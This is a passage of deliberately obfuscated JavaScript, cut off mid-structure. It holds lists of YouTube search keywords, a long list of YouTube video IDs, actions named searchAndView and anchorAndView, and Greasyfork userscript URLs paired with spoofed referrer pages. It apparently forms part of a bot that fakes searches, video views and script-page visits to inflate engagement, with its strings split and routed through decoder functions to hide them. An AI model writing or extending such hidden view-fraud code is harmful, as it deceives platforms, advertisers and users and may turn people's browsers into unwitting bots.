searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + a0(0x10) + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + a2(0x8) + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + Z(0x7, 'Fva$'))['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1c64 + 0x4a1 * -0x1 + -0x5b * -0x5d)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x3ca + 0x1 * 0x1cc3 + -0x7 * 0x4a5)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0xb * 0x37 + 0x1529 + -0x1783);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    a0(0x19) + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    a0(0x1d) + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + a0(0x11) + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0xd) + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x14, 'zx#&') + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + Z(0x18, 'NL@r') + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
